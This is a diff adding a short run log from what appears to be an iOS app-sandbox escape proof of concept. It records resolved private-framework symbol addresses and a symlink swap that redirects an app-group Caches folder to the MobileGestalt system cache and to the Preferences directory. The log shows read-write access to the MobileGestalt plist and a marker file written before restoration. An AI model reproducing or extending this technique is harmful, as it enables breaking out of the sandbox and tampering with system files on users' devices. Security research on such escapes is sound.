@@ -1,0 +1,26 @@
+================ BQ272 v8 escape proofs ================
+date=2026-11-08 03:14:23 +0000 uid=501 bundle=app.lake9674.aquila8809
+dlopen MCM = 0x3773153c0 (ok)
+xpc sym create=0x18d727250 release=0x18d72770c array=0x18d7329b0 append=0x18d732bcc
+sym create=0x2150c746c class=0x2150c7c2c ids=0x2150d0dd4 gids=0x2150c7648 flags=0x2150c7e2c part=0x2150e7ffc domain=0x2150e8224 one=0x2150ce1ec path=0x2150e93c0 token=0x2150d60e4 free=0x2150ce0c8 consume=0x2d7983560 release=0x2d79837ec
+group=file:///private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/
+escape[mg]: target=/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches
+swap: symlink /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches -> /private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches ret=0 errno=0
+escape[mg]: result=0x107c0fa20
+escape[mg]: token=YES consume=2
+MG plist read bytes=10740
+MG plist parse class=__NSDictionaryI err=(null)
+MG plist O_RDWR=4 errno=0 (Undefined error: 0)
+marker[mg-dir] open=4 errno=0 (Undefined error: 0)
+marker[mg-dir] write=3 unlink=0 errno=0
+restore: /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches.bq_cur -> /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches ok=1 err=(null)
+escape[mg]: release handle + restore Caches
+escape[prefs]: target=/var/mobile/Library/Preferences
+swap: symlink /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches -> /var/mobile/Library/Preferences ret=0 errno=0
+escape[prefs]: result=0x107c0c1e0
+escape[prefs]: token=NO consume=-5
+restore: /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches.bq_cur -> /private/var/mobile/Containers/Shared/AppGroup/C621BBFA-75CB-4046-A043-8797A7738660/Library/Caches ok=1 err=(null)
+LS allApplications count=0
+com.apple.PosterBoard not found in LS
+PosterBoard container=(null)
+================ PROBE_DONE ================
